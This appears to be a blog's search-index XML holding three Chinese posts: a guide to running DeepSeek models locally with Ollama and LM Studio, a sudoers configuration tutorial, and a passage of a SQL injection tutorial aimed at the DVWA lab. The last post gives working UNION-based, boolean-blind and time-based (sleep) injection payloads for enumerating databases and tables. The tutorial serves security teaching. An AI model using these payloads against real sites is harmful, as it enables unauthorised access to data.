<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>突破限制，本地部署deepseek模型！</title>
      <link href="/posts/b218bd65.html"/>
      <url>/posts/b218bd65.html</url>
      
        <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><blockquote><p>前段时间推出的DeepSeek R1推理模型，与传统的大型语言模型有些不同，它能模拟逐步思考的过程，将复杂问题分解为更小的逻辑步骤，再得出解决方案，在数学推理、编程辅助和决策制定等需要深度理解的任务上表现更出色。这里也提供了两种方法来本地运行官方开源的模型。</p></blockquote><h2 id="ollama部署"><a href="#ollama部署" class="headerlink" title="ollama部署"></a>ollama部署</h2><h3 id="下载安装程序"><a href="#下载安装程序" class="headerlink" title="下载安装程序"></a>下载安装程序</h3><ul><li>在<a href="https://ollama.com/">官网</a>点击<code>Download</code>下载对应系统的安装程序。<br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250130202815.jpg"></li></ul><h3 id="安装ollama"><a href="#安装ollama" class="headerlink" title="安装ollama"></a>安装ollama</h3><ul><li><code>C盘</code>够大的打开直接<code>install</code>即可<br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250130204259.jpg"></li><li>如果你想安装到指定目录可以在安装程序目录上方输入<code>CMD</code>打开命令行窗口<br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250131023220.jpg"></li><li>然后执行下方命令</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">OllamaSetup.exe /DIR=<span class="string">&quot;d:\ollama&quot;</span></span><br><span class="line"><span class="comment">#OllamaSetup.exe 下载的安装程序名</span></span><br><span class="line"><span class="comment">#d:\ollama 安装的路径</span></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250131023503.jpg"></p><h3 id="下载模型"><a href="#下载模型" class="headerlink" title="下载模型"></a>下载模型</h3><ul><li>找到模型并打开页面<br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250130205303.jpg"></li><li>选择模型大小。正常情况下根据自己的显卡显存选择，比如显存8G就选择8B的模型<br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250130205517.jpg"></li><li>命令行打开执行安装模型，后即可完成。<br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250131012923.jpg"></li></ul><h3 id="更换模型目录-端口"><a href="#更换模型目录-端口" class="headerlink" title="更换模型目录&#x2F;端口"></a>更换模型目录&#x2F;端口</h3><ul><li>默认模型存放位置是在<code>C盘</code>的<code>C:\Users\用户名\.ollama\models</code>下。<br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250131032026.jpg"></li><li>打开设置的高级系统设置，设置一个新环境变量名字<code>OLLAMA_MODELS</code>，变量值为新的模型文件夹存放路径<br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250131033202.jpg"></li><li>将默认模型路径下的<code>models</code>文件夹移动到新目录下。后即可。注意！这样卸载ollama后是不会删除模型文件的。<br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250131033628.jpg"></li></ul><h4 id="修改端口"><a href="#修改端口" class="headerlink" title="修改端口"></a>修改端口</h4><ul><li>修改<code>ollama</code>默认映射端口，一样是修改环境变量，更改<code>OLLAMA_HOST</code>的值即可。<br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250131033906.jpg"></li></ul><h2 id="LMstudio部署"><a href="#LMstudio部署" class="headerlink" title="LMstudio部署"></a>LMstudio部署</h2><h3 id="下载安装程序-1"><a href="#下载安装程序-1" class="headerlink" title="下载安装程序"></a>下载安装程序</h3><ul><li>在<a href="https://lmstudio.ai/">官网</a>选择对应系统的安装程序下载。<br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250131013214.jpg"></li></ul><h3 id="安装LMstudio"><a href="#安装LMstudio" class="headerlink" title="安装LMstudio"></a>安装LMstudio</h3><ul><li>设置安装路径后默认安装即可<br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250131013441.jpg"></li></ul><h3 id="更换为国内源"><a href="#更换为国内源" class="headerlink" title="更换为国内源"></a>更换为国内源</h3><ul><li>右键桌面图标，打开文件所在位置，默认在<code>C:\Users\用户名\AppData\Local\Programs\lm-studio\LM Studio</code><br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250131013656.jpg"></li><li>打开当前目录下的<code>\resources\app\.webpack\renderer\main_window.js</code>文件。<br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250131013942.jpg"></li><li>将<code>huggingface.co</code>域名替换为<code>hf-mirror.com</code>域名<br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250131014150.jpg"></li><li>打开当前目录下的<code>\resources\app\.webpack\main\index.js</code><br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250131014434.jpg"></li><li>和上一步替换的域名一样。<br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250131014525.jpg"></li></ul><h3 id="下载模型-1"><a href="#下载模型-1" class="headerlink" title="下载模型"></a>下载模型</h3><ul><li>这里下载<code>DeepSeek-R1</code>的<code>Distill</code>模型，具体步骤可以看图。<br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250131014955.jpg"></li><li>选择模型后即可使用。<br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250131030557.jpg"></li></ul><h3 id="扩展玩法-模型设定"><a href="#扩展玩法-模型设定" class="headerlink" title="扩展玩法|模型设定"></a>扩展玩法|模型设定</h3><ul><li>在页面的右上角的药水瓶，点开，可以给模型设置预设。<br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250131031612.jpg"></li></ul><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><h3 id="为ollama添加GUI"><a href="#为ollama添加GUI" class="headerlink" title="为ollama添加GUI"></a>为ollama添加GUI</h3><ul><li>这里就可以依靠另一个项目<a href="https://chatboxai.app/zh">chatbox</a>，在官网下载对应系统的版本。<br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250131035110.jpg"></li><li>设置安装目录后安装即可<br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250131035323.jpg"></li><li>设置<code>ollama</code>的服务地址默认为<code>127.0.0.1</code>的本地回环地址，端口默认为<code>8000</code>，我这里前面更改了端口地址。<br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250131035445.jpg"></li><li>可自行设置一个搭档，我这里直接照搬之前<code>LMstudio</code>设置的<br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250131035746.jpg"></li><li>应用测试<br><img src="https://imges.xenon.us.kg/20250131/Pasted-image-20250131040040.jpg"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 不务正业 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大模型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sudo命令的配置及使用</title>
      <link href="/posts/5b7c57ab.html"/>
      <url>/posts/5b7c57ab.html</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><blockquote><p>sudo 命令是 Linux 系统中一个非常重要的工具，它允许普通用户以超级用户（通常是 root）或其他用户的身份执行命令。从概念上来说，在普通用户在权限不够的时候，通过 sudo 命令 “摇人”，这个 “人” 就是拥有更高权限的用户（通常是 root）。<br><code>sudoers</code>文件在<code>etc</code>目录下。通过使用命令<code>visudo</code>来进行编辑，因为它具有检测功能。</p></blockquote><h2 id="Sudo文件格式"><a href="#Sudo文件格式" class="headerlink" title="Sudo文件格式"></a>Sudo文件格式</h2><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><table><thead><tr><th>名称</th><th>位置</th><th>说明</th></tr></thead><tbody><tr><td><code>/etc/sudoers</code></td><td><code>/etc/sudoers</code></td><td><code>sudo</code> 的核心配置文件，使用 <code>visudo</code> 编辑，定义用户或组的 <code>sudo</code> 权限。</td></tr><tr><td><code>/etc/sudoers.d/</code></td><td><code>/etc/sudoers.d/</code></td><td>存放<code>sudo</code> 配置文件的子目录，权限设为 440，系统会自动读取。</td></tr><tr><td><code>/var/log/auth.log</code></td><td><code>/var/log/auth.log</code></td><td>记录<code>sudo</code> 使用情况的日志文件，用于审计和故障排除。</td></tr><tr><td><code>/usr/bin/sudo</code></td><td><code>/usr/bin/sudo</code></td><td><code>sudo</code> 命令的可执行文件位置。</td></tr><tr><td><code>/usr/lib/sudo/</code></td><td><code>/usr/lib/sudo/</code></td><td>包含<code>sudo</code> 相关的库和辅助文件，支持 <code>sudo</code> 运行。</td></tr></tbody></table><h3 id="sudoers权限分配"><a href="#sudoers权限分配" class="headerlink" title="sudoers权限分配"></a>sudoers权限分配</h3><h4 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h4><ul><li>配置用户<code>sudo</code>命令配置</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#表示用户(%组别)能用sudo在所有主机上使用全部命令</span></span><br><span class="line">username ALL=(ALL) ALL</span><br></pre></td></tr></table></figure><ul><li>命令组，将多个命令创建一个组，和能使用的命令可执行文件路径。注意命令组名称需要为大写。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cmnd_Alias groupname = /usr/bin/ls, /usr/sbin/wget, /usr/bin/curl</span><br></pre></td></tr></table></figure><h4 id="创建命令组"><a href="#创建命令组" class="headerlink" title="创建命令组"></a>创建命令组</h4><ul><li>多个命令使用<code>,</code>分开。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Cmnd_Alias SERVER_CODE = /usr/bin/wget, /usr/bin/ls, /usr/bin/cat</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250120/Pasted-image-20250120161618.jpg" alt="Pasted-image-20250120161618"></p><h4 id="创建用户sudo权限"><a href="#创建用户sudo权限" class="headerlink" title="创建用户sudo权限"></a>创建用户sudo权限</h4><ul><li>一样多个命令使用<code>,</code>进行分隔。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Server  ALL=(ALL) /usr/bin/ls</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250120/Pasted-image-20250120161638.jpg" alt="Pasted-image-20250120161638"></p><h4 id="为用户设置命令组"><a href="#为用户设置命令组" class="headerlink" title="为用户设置命令组"></a>为用户设置命令组</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/sudoers | grep Server</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250120/Pasted-image-20250120162533.jpg" alt="Pasted-image-20250120162533"></p><h4 id="设置排除命令"><a href="#设置排除命令" class="headerlink" title="设置排除命令"></a>设置排除命令</h4><ul><li>多个命令使用<code>,</code>分隔开来</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Cmnd_Alias SERVER_CODE = ALL, !/usr/bin/ls</span><br><span class="line">Server  ALL=(ALL) SERVER_CODE</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250120/Pasted-image-20250120163233.jpg" alt="Pasted-image-20250120163233"></p><h4 id="用户组配置"><a href="#用户组配置" class="headerlink" title="用户组配置"></a>用户组配置</h4><ul><li>组的名字前面需要添加一个<code>%</code>才能保证配置文件识别到这个是组</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%<span class="built_in">where</span>  ALL=(ALL) SERVER_CODE</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250120/Pasted-image-20250120164111.jpg" alt="Pasted-image-20250120164111"></p><h2 id="Sudo命令"><a href="#Sudo命令" class="headerlink" title="Sudo命令"></a>Sudo命令</h2><h3 id="命令参数"><a href="#命令参数" class="headerlink" title="命令参数"></a>命令参数</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──（Server㉿lvy）-[~]</span><br><span class="line">└─$ <span class="built_in">sudo</span></span><br><span class="line">用法： <span class="built_in">sudo</span> -h | -K | -k | -V</span><br><span class="line">用法： <span class="built_in">sudo</span> -v [-ABkNnS] [-g 组] [-h 主机] [-p 提示符] [-u 用户］</span><br><span class="line">用法： <span class="built_in">sudo</span> -l [-ABkNnS] [-g group] [-h host] [-p prompt] [-U user］</span><br><span class="line">            [命令 [arg ...]] [-U 用户］</span><br><span class="line">使用方法： <span class="built_in">sudo</span> [-ABbEHkNnPS] [-r role] [-t <span class="built_in">type</span>] [-C num] [-D directory] [-g group] [-h host] [-p prompt] [-U user] [-u user] [<span class="built_in">command</span> [arg ...]]</span><br><span class="line">            [-g 组] [-h 主机] [-p 提示符] [-R 目录] [-T 超时］</span><br><span class="line">            [-u user] [VAR=value] [-i | -s] [<span class="built_in">command</span> [arg ...]] (命令)</span><br><span class="line">用法： <span class="built_in">sudo</span> -e [-ABkNnS] [-r role] [-t <span class="built_in">type</span>] [-C num] [-D directory］</span><br><span class="line">            [-g 组] [-h 主机] [-p 提示符] [-R 目录] [-T 超时］</span><br><span class="line">            [-u 用户] 文件 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><h4 id="查看可使用的命令"><a href="#查看可使用的命令" class="headerlink" title="查看可使用的命令"></a>查看可使用的命令</h4><ul><li><code>-l</code>查看当前用户能用<code>sudo</code>提权使用的命令</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250120/Pasted-image-20250120164635.jpg" alt="Pasted-image-20250120164635"></p><h4 id="指定用户执行"><a href="#指定用户执行" class="headerlink" title="指定用户执行"></a>指定用户执行</h4><ul><li><code>-u</code>指定一个用户执行，这时候执行的操作就会使用指定用户的权限。权限不足则会无法执行</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -u root apt-get update</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250120/Pasted-image-20250120165132.jpg" alt="Pasted-image-20250120165132"></p><h4 id="打开另一用户shell"><a href="#打开另一用户shell" class="headerlink" title="打开另一用户shell"></a>打开另一用户shell</h4><ul><li><code>-i</code>打开另一用户的默认的shell，相当于以以那个用户执行</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -i</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250120/Pasted-image-20250120170719.jpg" alt="Pasted-image-20250120170719"></p><ul><li>如果配置不当的话<code>sudo</code>启动的终端也是具备有<code>root</code>权限的。<br><img src="https://imges.xenon.us.kg/20250120/Pasted-image-20250120171154.jpg" alt="Pasted-image-20250120171154"></li><li>放置这个情况只需要排除用<code>sudo</code>来执行shell就可以防止。<br><img src="https://imges.xenon.us.kg/20250120/Pasted-image-20250120171544.jpg" alt="Pasted-image-20250120171544"></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入测试步骤|注入类型</title>
      <link href="/posts/782cd2fe.html"/>
      <url>/posts/782cd2fe.html</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>测试的靶机为综合靶机DVWA，为基础步骤，没有前段过滤。</p></blockquote><h2 id="查找注入点"><a href="#查找注入点" class="headerlink" title="查找注入点"></a>查找注入点</h2><ol><li>注入点不仅仅局限于网页上可见的输入框，而是取决于请求包中传递的值。这些值可以存在于： * <strong>URL 中的 GET 传参：</strong> 参数直接显示在 URL 中，例如 <code>http://longyusec/index.php?id=1</code>。<ul><li><strong>POST 传参：</strong> 用于传输大量数据或敏感信息，参数值在请求体中，例如提交表单数据。</li><li><strong>请求头 (Headers)：</strong> 例如 <code>User-Agent</code>、<code>Referer</code>、<code>Cookie</code> 等。</li><li><strong>Cookie：</strong> 存储在用户浏览器中的小型文本文件。</li></ul></li></ol><h2 id="判断是否存在注入-构造闭合"><a href="#判断是否存在注入-构造闭合" class="headerlink" title="判断是否存在注入 (构造闭合)"></a>判断是否存在注入 (构造闭合)</h2><p>什么是构造闭合？</p><ul><li>构造闭合是指通过修改请求参数的值，来闭合原本的 SQL 语句结构，从而插入我们自己的恶意 SQL 代码。 观察源代码：</li><li>假设我们有以下 PHP 代码（虽然在实际测试中通常看不到）：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;;</span><br></pre></td></tr></table></figure><p>在这个 SQL 查询语句中，我们可以控制变量 <code>$id</code> 的值。 那要构造注入语句，首先需要判断它的<strong>闭合字符</strong>是什么。 观察代码，变量 <code>$id</code> 被单引号 <code>&#39;</code> 包裹，因此单引号就是这个 SQL 语句中 <code>$id</code> 变量的闭合字符。</p><ul><li>通过传递闭合字符来判断是否存在注入，当尝试传递一个单引号 <code>&#39;</code> 作为 <code>$id</code> 的值时 <img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250116163109.jpg" alt="Pasted-image-20250116163109"></li></ul><h3 id="为什么会报错？"><a href="#为什么会报错？" class="headerlink" title="为什么会报错？"></a>为什么会报错？</h3><p>让我们分析一下当传递 <code>&#39;</code> 时，SQL 语句会变成什么样子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT first_name, last_name FROM users WHERE user_id = &#x27;&#x27;&#x27;;</span><br></pre></td></tr></table></figure><p>原本 <code>$id</code> 的值被替换成了 <code>&#39;</code>，导致 <code>WHERE</code> 子句变成了 <code>WHERE user_id = &#39;&#39;&#39;</code>。 这里出现了三个单引号，SQL 语法解析器无法正确理解这个语句，因此会抛出错误。 这正是我们判断是否存在 SQL 注入漏洞的一个重要依据。</p><h3 id="常见的闭合方式："><a href="#常见的闭合方式：" class="headerlink" title="常见的闭合方式："></a>常见的闭合方式：</h3><ul><li><strong>无引号：</strong><code>$id</code> 例如： <code>WHERE user_id = 123</code></li><li><strong>单引号：</strong><code>&#39;$id&#39;</code> 例如： <code>WHERE username = &#39;admin&#39;</code></li><li><strong>双引号：</strong><code>&quot;$id&quot;</code> 例如： <code>WHERE email = &quot;test@example.com&quot;</code></li><li><strong>括号：</strong><code>($id)</code> 例如： <code>WHERE id IN (1, 2, 3)</code></li><li><strong>复杂组合：</strong><code>((&#39;&quot;$id&quot;&#39;))</code> 虽然不常见，但在某些复杂场景下可能出现。</li></ul><h2 id="注入形式"><a href="#注入形式" class="headerlink" title="注入形式"></a>注入形式</h2><blockquote><p>注入类型分为两种，一种是有回显查询内容的常规形注入，一种是无查询的回显信息的盲注。</p></blockquote><h3 id="常规形式"><a href="#常规形式" class="headerlink" title="常规形式"></a>常规形式</h3><ul><li>在他查询的代码里是会将查询的结果返回到前段页面。注入方式：配合联合查询<code>union</code>查询相关信息。 <img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250116184754.jpg" alt="Pasted-image-20250116184754"></li></ul><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><ul><li>使他闭合能够出现数据库报错的。 <img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250116163109.jpg" alt="Pasted-image-20250116163109"></li></ul><h3 id="盲注形式"><a href="#盲注形式" class="headerlink" title="盲注形式"></a>盲注形式</h3><ul><li>查看源代码，将报错和查询的内容统一返回一个结果。注入方式：通过<code>sleep</code>查看页面的返回时间或者根据页面的只有正确或者错误的回显来判断。 <img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250116185017.jpg" alt="Pasted-image-20250116185017"></li></ul><h4 id="时间盲注例子"><a href="#时间盲注例子" class="headerlink" title="时间盲注例子"></a>时间盲注例子</h4><ul><li>通过<code>sleep</code>语句让查询产生延迟，判断存在盲注。布尔盲注话会有明显的统一回显信息，正确或者错误的。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and sleep(5) #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250116192208.jpg" alt="Pasted-image-20250116192208"><br>Pasted-image-20250116192208</p><h2 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h2><h3 id="常规类型"><a href="#常规类型" class="headerlink" title="常规类型"></a>常规类型</h3><ul><li>使用<code>order by </code>：根据第几列(字段)来排序，如果报错则证明当前查询的字段为几个</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 1 #</span><br><span class="line">1&#x27; order by 2 #</span><br><span class="line">1&#x27; order by 3 #  根据第三个字段排序时报错。</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250116190055.jpg" alt="Pasted-image-20250116190055"><br>Pasted-image-20250116190055</p><h3 id="盲注类型"><a href="#盲注类型" class="headerlink" title="盲注类型"></a>盲注类型</h3><ul><li>盲注中大部分不需要猜测字段列数，查询字段列数是为了使用联合查询<code>union</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 1 #</span><br><span class="line">1&#x27; order by 2 #</span><br><span class="line">1&#x27; order by 3 #  根据第三个字段排序时报错。</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250116193748.jpg" alt="Pasted-image-20250116193748"><br>Pasted-image-20250116193748</p><h3 id="为什么这样构建语句"><a href="#为什么这样构建语句" class="headerlink" title="为什么这样构建语句"></a>为什么这样构建语句</h3><ul><li>试着将注入的语句替换为他查询语句中的<code>$id</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#将语句插入今后后三个&#x27;是会报错的，但是可以利用#注释掉后面的一个单引号</span><br><span class="line">SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; order by 1 #&#x27;;</span><br></pre></td></tr></table></figure><h2 id="查询当前数据库-判断显错点"><a href="#查询当前数据库-判断显错点" class="headerlink" title="查询当前数据库&#x2F;判断显错点"></a>查询当前数据库&#x2F;判断显错点</h2><h3 id="常规形式-1"><a href="#常规形式-1" class="headerlink" title="常规形式"></a>常规形式</h3><ul><li>配合联合查询，前面知道只有两个字段(列)，那么就要判断他显示查询数据的点是那个字段</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#显错点为1，2字段</span><br><span class="line">1&#x27; union select 1,2 # </span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250116194605.jpg" alt="Pasted-image-20250116194605"><br>Pasted-image-20250116194605</p><ul><li>使用显错点<code>2</code>字段获取当前数据库为<code>dvwa</code>。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,database() # </span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250116195148.jpg" alt="Pasted-image-20250116195148"><br>Pasted-image-20250116195148</p><h3 id="盲注形式-1"><a href="#盲注形式-1" class="headerlink" title="盲注形式"></a>盲注形式</h3><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><ul><li>判断数据库名长度</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and length(substr(database(),1)) = 4 #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117182620.jpg" alt="Pasted-image-20250117182620"><br>Pasted-image-20250117182620</p><ul><li>通过判断查询的数据库名，第一个字符是什么来判断,存在则显示正确回显信息。知道数据库第一个字符为<code>d</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#从第一个字符开始提取，提取一个字符</span><br><span class="line">1&#x27; and (select substr(database(), 1, 1) = &#x27;a&#x27;) #</span><br><span class="line">....</span><br><span class="line">1&#x27; and (select substr(database(), 1, 1) = &#x27;d&#x27;) #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250116195729.jpg" alt="Pasted-image-20250116195729"><br>Pasted-image-20250116195729</p><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><ul><li>先使用<code>if</code>函数先判断数据库的长度</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and if((length(substr(database(),1)) = 4),sleep(5),null) #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250116221530.jpg" alt="Pasted-image-20250116221530"><br>Pasted-image-20250116221530</p><ul><li>先获取数据库名第一个字符的</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#if判断获取数据库的名字并从第一个字符开始截取他第一个字符，判断是否为a，是延迟5秒，否返回</span><br><span class="line">1&#x27; and if(substr(database(), 1, 1)= &#x27;a&#x27;, sleep(5), false) #</span><br><span class="line">...</span><br><span class="line">1&#x27; and if(substr(database(), 1, 1)= &#x27;d&#x27;, sleep(5), false) #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117201730.jpg" alt="Pasted-image-20250117201730"><br>Pasted-image-20250117201730</p><h2 id="获取数据库中的表名"><a href="#获取数据库中的表名" class="headerlink" title="获取数据库中的表名"></a>获取数据库中的表名</h2><blockquote><p>知道了当前数据库的名字可以尝试获取当前数据库的表名，数据库的表名存放在<code>information_schema.tables</code>，information_schema数据库中的tables表。里面的table_name字段，数据库名为table_schema字段。</p></blockquote><h3 id="常规形式-2"><a href="#常规形式-2" class="headerlink" title="常规形式"></a>常规形式</h3><ul><li>使用显错点<code>2</code>字段来查询，通过使用联合查询，使用<code>group_concat</code>函数将查询的字段合并成字符串输出。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema = database() #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250116225037.jpg" alt="Pasted-image-20250116225037"><br>Pasted-image-20250116225037</p><h3 id="盲注形式-2"><a href="#盲注形式-2" class="headerlink" title="盲注形式"></a>盲注形式</h3><blockquote><p>盲注形式无法直接查看只能通过猜表的数量后再猜表名的字符。耗时耗力。</p></blockquote><h4 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><ul><li>先利用<code>count</code>获取指定字段的行数，也就是表的数量。在进行判断有多少表</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=2 #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250116233245.jpg" alt="Pasted-image-20250116233245"><br>Pasted-image-20250116233245</p><ul><li>再判断第一个表的长度。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#select查询当前数据库中的表名并用limit从第0行开始算，获取第一行的表，substr从第一个字符开始截取出表名，length获取表的长度</span><br><span class="line">1&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #</span><br><span class="line">#第二个表类似,改变的点为limit从第一行开始，获取第一行的数据。(limit除开字段外，第一行数据为第0行算)</span><br><span class="line">1&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1))=5 #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250116234106.jpg" alt="Pasted-image-20250116234106"><br>Pasted-image-20250116234106</p><ul><li>判断第一个表的字符</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#先select查询information_schema.tables中的table_name字段获取当前数据库的表名，截取第一个，再用substr获取第一个字符。</span><br><span class="line">1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;a&#x27; #</span><br><span class="line">...</span><br><span class="line">1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),5,1)=&#x27;a&#x27; #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117164446.jpg" alt="Pasted-image-20250117164446"><br>Pasted-image-20250117164446</p><h4 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h4><ul><li>猜数据库中表数量有多少。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and if((select count(table_name) from information_schema.tables where table_schema=database()) = 2,sleep(5),null) #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117184042.jpg" alt="Pasted-image-20250117184042"><br>Pasted-image-20250117184042</p><ul><li>猜表中第一个字段的长度为多少。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#第一个字段</span><br><span class="line">1&#x27; and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),null) #</span><br><span class="line">...</span><br><span class="line">1&#x27; and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1))=5,sleep(5),null) #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117175133.jpg" alt="Pasted-image-20250117175133"><br>Pasted-image-20250117175133</p><ul><li>通过<code>if</code>语句猜表中的字符是否为真，来执行延迟。这里猜第一个字段的第一个字符。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and if((substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;a&#x27;),sleep(5),null) #</span><br><span class="line">...</span><br><span class="line">1&#x27; and if((substr((select 